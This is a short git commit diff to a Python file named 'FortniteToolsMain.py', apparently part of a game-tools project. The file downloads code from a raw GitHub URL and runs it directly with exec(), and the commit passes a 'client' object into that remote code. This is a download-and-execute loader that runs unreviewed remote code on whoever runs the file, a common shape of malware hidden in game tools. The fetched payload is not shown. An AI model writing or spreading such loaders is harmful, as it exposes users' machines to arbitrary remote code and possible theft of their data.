d14ca7af1196922db856b900c30b72ad5f3682e4
SSkiprs <159820084+SSkiprs@users.noreply.github.com>
2024-03-15 14:14:39 -0400

    Update FortniteToolsMain.py

--- FortniteToolsMain.py
+++ FortniteToolsMain.py
@@ -1,13 +1,13 @@
 import requests
 
-def execute_code_from_url(url):
+def execute_code_from_url(url, client=None):
     response = requests.get(url)
     if response.status_code == 200:
         code = response.text
-        exec(code)  # or eval(code) depending on the use case
+        exec(code, globals(), {'client': client})
     else:
         print("Failed to fetch code from URL")
 
 # Example usage:
 url = "https://raw.githubusercontent.com/SSkiprs/FortniteTools/FortniteTools/FortniteToolsRAW.py"  # Replace with the actual URL
-execute_code_from_url(url)
+execute_code_from_url(url, client)
